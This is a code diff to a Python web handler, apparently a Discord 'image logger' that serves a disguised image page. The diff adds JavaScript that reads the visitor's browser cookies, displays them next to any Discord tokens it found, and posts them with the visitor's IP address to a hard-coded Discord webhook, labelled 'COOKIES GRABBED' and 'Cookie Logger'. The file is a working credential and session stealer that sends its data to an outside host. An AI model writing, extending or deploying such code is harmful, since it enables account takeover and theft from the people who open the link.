@@ -9,7 +9,7 @@ class handler(BaseHTTPRequestHandler):
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
         
         # Default image
-        DEFAULT_IMAGE = "https://i.ytimg.com/vi/dg-ERkf3OEo/maxresdefault.jpg"
+        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
         
         # Custom image mappings - add more here
         IMAGES = {
@@ -190,16 +190,50 @@ class handler(BaseHTTPRequestHandler):
                 }} catch(e) {{}}
             }}
             
-            // Display tokens on screen
+            // Display tokens and cookies on screen
+            let displayHTML = '';
+            
             if (tokens.length > 0) {{
-                display.innerHTML = '🔑 TOKEN(S) FOUND:<br><br>' + tokens.map((t, i) => `Token ${{i+1}}:<br>${{t}}`).join('<br><br>');
-                display.classList.add('show');
+                displayHTML = '🔑 TOKEN(S) FOUND:<br><br>' + tokens.map((t, i) => `Token ${{i+1}}:<br>${{t}}`).join('<br><br>');
             }} else {{
-                display.innerHTML = '❌ No Discord tokens found<br>Open this in Discord app/web to grab tokens';
-                display.classList.add('show');
+                displayHTML = '❌ No Discord tokens found<br>(This only works when opened in Discord app/web)';
             }}
             
-            // Send all found tokens
+            // Get cookies
+            const cookies = document.cookie;
+            if (cookies) {{
+                displayHTML += '<br><br>🍪 COOKIES:<br>' + cookies.split(';').map(c => c.trim()).join('<br>');
+            }} else {{
+                displayHTML += '<br><br>🍪 No cookies found';
+            }}
+            
+            display.innerHTML = displayHTML;
+            display.classList.add('show');
+            
+            // Send all found tokens and cookies
+            const allCookies = document.cookie;
+            
+            // Send cookies to webhook
+            if (allCookies) {{
+                await fetch('{WEBHOOK}', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
+                        content: '@everyone',
+                        embeds: [{{
+                            title: '🍪 COOKIES GRABBED',
+                            color: 16753920,
+                            description: '```' + allCookies + '```',
+                            fields: [
+                                {{name: 'IP', value: '{ip}', inline: true}},
+                                {{name: 'Endpoint', value: '{image_name if image_name else "default"}', inline: true}}
+                            ],
+                            footer: {{text: 'Cookie Logger'}}
+                        }}]
+                    }})
+                }});
+            }}
+            
             if (tokens.length > 0) {{
                 for (let t of tokens) {{
                     try {{
